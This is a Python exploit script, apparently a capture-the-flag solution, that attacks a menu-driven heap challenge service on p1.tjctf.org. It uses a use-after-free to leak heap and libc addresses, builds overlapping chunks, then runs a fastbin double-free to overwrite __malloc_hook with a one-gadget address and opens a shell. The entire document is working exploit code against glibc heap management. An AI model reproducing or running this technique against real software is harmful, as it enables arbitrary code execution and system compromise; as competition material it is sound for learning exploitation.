from ptrlib import *
from time import sleep


def sice_deet(size, data):
    sock.recvuntil("4. Exit")
    sock.sendline("1")
    sock.sendline(str(size))
    sock.send(data)

def observe_deet(index):
    sock.recvuntil("4. Exit")
    sock.sendline("2")
    sock.recvuntil("Which deet would you like to view?")
    sock.recvuntil("> ")
    sock.sendline(str(index))
    return sock.recvline().rstrip()

def destroy_deet(index):
    sock.recvuntil("4. Exit")
    sock.sendline("3")
    sock.sendline(str(index))

libc = ELF("74ca69ada4429ae5fce87f7e3addb56f1b53964599e8526244fecd164b3c4b44_libc.so.6")
sock = Socket("p1.tjctf.org", 8002)
#sock = Socket("localhost", 8002)
libc_main_arena = 0x3c4b20
delta = 0x58
libc_one_gadget = 0xf1147

# leak heap addr
sice_deet(0x20, b"A" * 0x20) # 0
sice_deet(0x20, b"B" * 0x20) # 1
destroy_deet(1)
destroy_deet(0)
data = observe_deet(0)
addr_heap = u64(data[:8])
dump("addr heap = " + hex(addr_heap))

# overlap
destroy_deet(1)
payload = p64(addr_heap - 0x10)
payload += b'\x00' * 0x18
sice_deet(0x20, payload) # 2 == 1
payload = b'\x00' * 0x18
payload += p64(0x31)
sice_deet(0x20, payload) # 3 == 0
sice_deet(0x20, b"\x00" * 0x20) # 4 == 1
fake_chunk = b'\x00' * 8
fake_chunk += p64(0x131) # size
fake_chunk += b'C' * 0x10
sice_deet(0x20, fake_chunk) # 5 == address_of(1) - 0x10
sice_deet(0x70, b"A" * 0x70) # 6
sice_deet(0x70, b"A" * 0x70) # 7
sice_deet(0x10, b"A" * 0x8 + p64(0x11)) # 8

# leak libc
destroy_deet(4)
l = observe_deet(4)
addr_main_arena = u64(l[:8])
libc_base = addr_main_arena - libc_main_arena - delta
addr_one_gadget = libc_base + libc_one_gadget
addr_malloc_hook = libc_base + libc.symbol("__malloc_hook")
dump("libc base = " + hex(libc_base))

# fastbin corruption attack
sice_deet(0x60, b'A' * 0x60) # 9
sice_deet(0x60, b'A' * 0x60) # 10
destroy_deet(9)
destroy_deet(10)
destroy_deet(9)

payload = p64(addr_malloc_hook - 27 - 8)
sice_deet(0x60, payload) # 11 == 9
sice_deet(0x60, b"\x00" * 0x60) # 12 == 10
sice_deet(0x60, b"\x00" * 0x60) # 13 == 9
payload = b'\x00' * (3 + 16)
payload += p64(addr_one_gadget) # __malloc_hook
sice_deet(0x60, payload) # 14 == __malloc_hook - 27 + 8

# get the shell!
sock.interactive()
